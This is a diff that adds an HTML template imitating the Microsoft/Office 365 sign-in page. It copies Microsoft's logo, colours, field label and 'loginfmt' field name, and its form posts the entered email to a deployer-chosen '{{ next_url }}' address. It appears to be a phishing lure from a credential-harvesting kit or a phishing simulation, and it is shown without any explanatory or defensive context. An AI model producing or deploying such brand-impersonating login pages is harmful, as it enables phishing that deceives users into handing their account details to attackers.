@@ -1,0 +1,32 @@
+<html>
+<head>
+    <title>Sign in to your account</title>
+    <style>
+        body{font-family:Arial,Helvetica,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;margin:0}
+        .box{background:#fff;padding:40px 50px;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.1);width:320px;box-sizing:border-box;text-align:center}
+        img{width:120px;margin-bottom:30px}
+        h3{margin:0 0 20px;font-weight:600;font-size:20px;color:#333}
+        input{width:100%;padding:10px 12px;margin-bottom:20px;font-size:16px;border:1px solid #ccc;border-radius:4px}
+        button{background:#0067b8;color:#fff;border:none;border-radius:4px;padding:10px 0;width:100%;font-size:16px;cursor:pointer}
+        button:hover{background:#005ba1}
+        a{display:block;margin-top:15px;font-size:14px;color:#0067b8;text-decoration:none}
+    </style>
+</head>
+<body>
+    <div class="box">
+        <!-- Office 365 logo (SVG inline to avoid external request) -->
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" role="img" aria-label="Microsoft logo" width="48" height="48">
+            <path fill="#f25022" d="M4 4h18v18H4z"/>
+            <path fill="#00a4ef" d="M26 4h18v18H26z"/>
+            <path fill="#7fba00" d="M4 26h18v18H4z"/>
+            <path fill="#ffb900" d="M26 26h18v18H26z"/>
+        </svg>
+        <h3>Sign in</h3>
+        <form method="post" action="{{ next_url }}">
+            <input type="text" name="loginfmt" placeholder="Email, phone, or Skype" required autofocus>
+            <button type="submit">Next</button>
+        </form>
+        <a href="#">Can’t access your account?</a>
+    </div>
+</body>
+</html>
